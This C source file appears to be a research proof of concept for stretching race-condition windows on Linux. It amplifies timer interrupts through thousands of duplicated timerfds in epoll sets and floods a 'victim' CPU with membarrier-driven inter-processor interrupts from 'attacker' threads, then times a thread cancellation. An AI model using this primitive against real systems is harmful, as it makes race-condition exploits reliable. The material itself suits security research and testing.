#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include <syscall.h>
#include <linux/membarrier.h>  /* Definition of  MEMBARRIER_*  constants */
#include <sched.h>
#include <sys/types.h> // for tid_t
#include <sys/timerfd.h> // for timerfd_*()
#include <sys/select.h> // for select()
#include <time.h> // for time()
#include <sys/epoll.h> // for epoll_create1()
#include <errno.h>

pthread_spinlock_t lock;

#define SYS_membarrier      324

#define NUM_THREADS         5
#define VICTIM_CPU          0
#define ATTACKER_CPU        1

#define EPOLL_INSTANCES     100
#define FD_PER_EPOLL        500

int **tfdups;
pthread_t spin_thread, kill_thread;
int timerfd;
struct itimerspec spec;
unsigned long timer_ns_delay;


// goal -> preempt this thread using timer interrupt and extend the execution of spinTheThread
void *killTheThread(void *to_kill) {
    
    pid_t tid = gettid();
	cpu_set_t cpu_set;
	CPU_ZERO(&cpu_set);
	CPU_SET(VICTIM_CPU, &cpu_set);
	sched_setaffinity(0, sizeof(cpu_set), &cpu_set);

    if(timerfd_settime(timerfd, 0, &spec, NULL)){
		printf("Error setting timer\n");
		exit(1);
	}
	pthread_spin_lock(&lock);
    //printf("Waiting for timer expiration...\n");

	//(&lock);
	clock_t start = clock();
	pthread_t *thread = (pthread_t *)to_kill;
	if(pthread_cancel(*thread)) {
		printf("Failed to kill thread\n");
	}
	pthread_spin_unlock(&lock);


	clock_t end = clock();
	
    double time = (double)1e3*(end-start)/CLOCKS_PER_SEC;
    if (time >= 400.0f)
		printf("Time to kill thread: %7.2fms with timer resolution %ld\n", time, timer_ns_delay);
	pthread_exit(NULL);
}

void *spinTheThread() {
	pthread_spin_lock(&lock);
	int o_state;
	pthread_setcanceltype(PTHREAD_CANCEL_ASYNCHRONOUS, &o_state);
	
	// let killTheThread preempt this thread in the loop
	//pthread_setcanceltype(PTHREAD_CANCEL_ASYNCHRONOUS, &o_state);
	//sleep(1);
	pthread_spin_unlock(&lock);
	while(1) { }
	pthread_exit(NULL); 
}

int init_epoll(int *epollfds, int num_instances) {
	for(int i = 0; i < num_instances; i++) {
		epollfds[i] = epoll_create1(0);
		if(epollfds[i] == -1){
			for(int j=0; j<i; j++){
				close(epollfds[j]);
			}
			return 1;
		}	
	}


    tfdups = (int **)malloc(EPOLL_INSTANCES * sizeof(int *));
	for(int i=0; i< EPOLL_INSTANCES; i++){
		tfdups[i] = (int *)malloc(FD_PER_EPOLL * sizeof(int));
	}

	return 0;
}

int init_tfdups(int tfd, int **tfdups, int *epollfds, int num_epolls, int num_tfdups) {
	// struct epoll uses to deliver events
	// configure to deliver when avaiable for read
	struct epoll_event event;
	// fd is ready when available for read
	event.events = EPOLLIN;
	for(int i=0; i<num_epolls; i++) {
		for(int j=0; j<num_tfdups; j++){
			event.data.u64 = (i * 10) + j;
            //printf("%d,%d\n", i, j);
			int fd = dup(tfd);
			if(fd == -1){
				return 1;
			}
			tfdups[i][j] = fd;
			if(epoll_ctl(epollfds[i], EPOLL_CTL_ADD, fd, &event))
			{
				return 1;
			}
		}
	} 	
	return 0;
}

// close fds and free
int cleanup(int *epollfds, int **tfdups, int num_epolls, int num_tfdups) {
	// close epoll fds
	for(int i=0; i<num_epolls; i++){
		close(epollfds[i]);
		if(tfdups != NULL) {
		for(int j = 0; j < num_tfdups; j++)
		{
			close(tfdups[i][j]);
		}
		free(tfdups[i]);}
	}
	if(tfdups != NULL) {
	free(tfdups);}
	pthread_spin_destroy(&lock);
	return 0;
}









inline static int
membarrier(int cmd, unsigned int flags, int cpu_id)
{
    return syscall(__NR_membarrier, cmd, flags, cpu_id);
}



void ipi_storm(void *cpu)
{
    int cpu_num = *(int*)cpu;
    cpu_set_t mask;
    CPU_ZERO(&mask);    // Initialize CPU mask to all zeroes
    CPU_SET(cpu_num, &mask);  // Set CPU core to argument 
    if (sched_setaffinity(0, sizeof(cpu_set_t), &mask) == -1) {
        perror("sched_setaffinity ipi");
        printf("Arg %d\n", cpu_num);
        exit(EXIT_FAILURE);
    }
    
    while(1)
    {
        int ret = membarrier(MEMBARRIER_CMD_PRIVATE_EXPEDITED_RSEQ, MEMBARRIER_CMD_FLAG_CPU, VICTIM_CPU);
    	if (ret < 0)
    	{
    		printf("membarrier syscall failed with error code %d\n", errno);
    		perror("membarrier()");
    	}
    }
}



int main(int argc, char** argv)
{
	
    pid_t pid;
    pthread_t ipi_storm_threads[NUM_THREADS];
    int epollfds[EPOLL_INSTANCES];
    timer_ns_delay = atol(argv[1]);

    // Register the current process for private expedited commands
    int ret = membarrier(MEMBARRIER_CMD_REGISTER_PRIVATE_EXPEDITED_RSEQ, 0, 0);
    if (ret == -1) {
        printf("Failed to register for private expedited commands: %s\n", strerror(errno));
        exit(EXIT_FAILURE);
    }

    // Call membarrier syscall with private expedited command
    ret = membarrier(MEMBARRIER_CMD_PRIVATE_EXPEDITED_RSEQ, 0, 0);
    if (ret == -1) {
        printf("membarrier syscall failed with error code %d: %s\n", errno, strerror(errno));
        exit(EXIT_FAILURE);
    }


    /*
        Pin attacker thread to ATTACKER_CPU
    */
    cpu_set_t mask;
    CPU_ZERO(&mask);    // Initialize CPU mask to all zeroes
    CPU_SET(ATTACKER_CPU, &mask);  
    if (sched_setaffinity(0, sizeof(cpu_set_t), &mask) == -1) {
        perror("sched_setaffinity");
        exit(EXIT_FAILURE);
    }

    /*
        Initialize arguments to IPI storm threads
    */
    int thread_args[NUM_THREADS];
    for (int i = 2; i < NUM_THREADS+2; i++)
    {
        thread_args[i-2] = i;           // args will hold the CPU that thread will run on 
    }


    /*
        Initialize epoll instances and allocate enough memory
    */
	if(init_epoll(epollfds, EPOLL_INSTANCES))
	{
		fprintf(stderr, "Failed to init epolls. Exiting\n");
		exit(1);
	}

    
    timerfd = timerfd_create(CLOCK_REALTIME, 0);
    if (timerfd <= 0)
    {
        fprintf(stderr, "timerfd_create\n");
        exit(EXIT_FAILURE);
    }
	if(pthread_spin_init(&lock, PTHREAD_PROCESS_PRIVATE)) 
	{
			fprintf(stderr, "Failed to init spin\n");
			exit(1);
	}


    spec.it_interval.tv_nsec = 0;
    spec.it_interval.tv_sec = 0;
    spec.it_value.tv_nsec = timer_ns_delay; // ns as argument
    spec.it_value.tv_sec = 0;
	//spec.it_value = initial;
	
    // Add multiple FDs to epoll		
	if(init_tfdups(timerfd, tfdups, epollfds, EPOLL_INSTANCES, FD_PER_EPOLL)){
		fprintf(stderr, "Failed to init tfdups. Exiting\n");
		cleanup(epollfds, tfdups, EPOLL_INSTANCES, FD_PER_EPOLL);
		exit(1);
	}
    pthread_create(&spin_thread, NULL, spinTheThread, NULL);
	// start timer
	
	
    
    
    pthread_create(&kill_thread, NULL, killTheThread, &spin_thread);
    for (int i = 0; i < NUM_THREADS; i++)
    {
        pthread_create(&ipi_storm_threads[i], NULL, ipi_storm, &thread_args[i]);
    }
    

    // timer should expire here
    struct epoll_event events[FD_PER_EPOLL];
    for(int i=0; i < EPOLL_INSTANCES; i++){
    	if(epoll_wait(epollfds[i], events, FD_PER_EPOLL, -1) == -1){
    		printf("Error epoll waiting\n");
    		break;
    	}
    }

    pthread_join(kill_thread, NULL);
    //printf("kill thread done\n");
    //pthread_join(spin_thread, NULL);
    // printf("spin thread done\n");
    for(int i = 0; i < NUM_THREADS; i++)
    {
     //   pthread_join(ipi_storm_threads[i], NULL);
    }
    
    cleanup(epollfds, tfdups, EPOLL_INSTANCES, FD_PER_EPOLL);
    //printf("Done\n");
    return 0;
}